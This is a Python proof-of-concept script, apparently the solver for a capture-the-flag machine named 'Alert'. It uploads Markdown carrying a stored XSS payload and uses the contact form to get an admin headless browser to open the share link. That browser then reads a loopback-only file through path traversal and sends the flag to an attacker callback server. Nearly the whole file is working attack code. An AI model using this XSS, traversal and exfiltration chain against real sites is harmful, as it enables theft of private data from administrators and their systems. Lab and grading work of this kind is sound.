#!/usr/bin/env python3
"""HTTP-only proof: stored Markdown XSS in the real admin Chromium retrieves Alert's Web Flag."""
import http.server
import html
import os
import re
import threading
import urllib.error
import urllib.parse
import urllib.request
import uuid

BASE = os.environ.get("TARGET_URL", "http://alert-target:8080").rstrip("/")
EXPECTED = os.environ["EXPECTED_FLAG"]
if not re.fullmatch(r"TTP\{[a-z2-7]{16}\}", EXPECTED):
    raise SystemExit("Expected Flag format is invalid")

arrived = threading.Event()
received = {"flag": None}


class Callback(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlsplit(self.path)
        query = urllib.parse.parse_qs(parsed.query)
        candidate = query.get("flag", [None])[0]
        if parsed.path == "/browser-proof" and candidate == EXPECTED:
            received["flag"] = candidate
            arrived.set()
        self.send_response(204)
        self.end_headers()

    def log_message(self, *_):
        pass


server = http.server.ThreadingHTTPServer(("0.0.0.0", 9090), Callback)
threading.Thread(target=server.serve_forever, daemon=True).start()


def send(path, data=None, headers=None):
    request = urllib.request.Request(BASE + path, data=data, headers=headers or {})
    with urllib.request.urlopen(request, timeout=20) as response:
        return response.status, response.read().decode("utf-8", "replace")


print("[1/7] Public site and loopback-only message reader")
_, page = send("/index.php")
assert "Visualize your Markdown" in page
try:
    send("/messages.php")
    raise AssertionError("Public player reached loopback-only message reader")
except urllib.error.HTTPError as error:
    assert error.code == 403, error.code

print("[2/7] Upload Markdown containing active HTML")
callback = "http://attacker:9090/browser-proof?flag="
js = (
    "<script>"
    'fetch("/messages.php?file=../../../opt/alert/private/web-flag.txt")'
    ".then(r => r.text())"
    ".then(t => {"
    'const m = t.match(/TTP\\{[a-z2-7]{16}\\}/);'
    'if (m) fetch("' + callback + '" + encodeURIComponent(m[0]));'
    "});"
    "</script>"
)
markdown = "# Shared meeting note\n\n" + js
boundary = "----alert" + uuid.uuid4().hex
payload = (
    ("--" + boundary + "\r\n"
     'Content-Disposition: form-data; name="file"; filename="note.md"\r\n'
     "Content-Type: text/markdown\r\n\r\n").encode()
    + markdown.encode()
    + ("\r\n--" + boundary + "--\r\n").encode()
)
_, page = send(
    "/visualizer.php",
    payload,
    {"Content-Type": "multipart/form-data; boundary=" + boundary},
)
match = re.search(r"/visualizer\.php\?link_share=[a-z0-9]{24}\.md", page)
assert match and "Shared meeting note" in page
share = match.group(0)

print("[3/7] Verify the stored Markdown share page")
_, shared = send(share)
assert "messages.php" in shared and "browser-proof" in shared

print("[4/7] Submit the share URL through the real Contact workflow")
data = urllib.parse.urlencode({
    "email": "reviewer@example.com",
    "message": "Please review http://alert.htb" + share,
}).encode()
send("/contact.php", data, {"Content-Type": "application/x-www-form-urlencoded"})

print("[5/7] Wait for target-local Chromium to execute XSS and read the real Flag")
assert arrived.wait(75), "Admin Chromium did not return the expected Flag"
assert received["flag"] == EXPECTED

print("[6/7] Confirm the callback contained the exact instance Flag")
print("PASS: stored XSS -> admin Chromium -> loopback traversal -> exact Web Flag")

print("[7/7] Stop callback server")
server.shutdown()
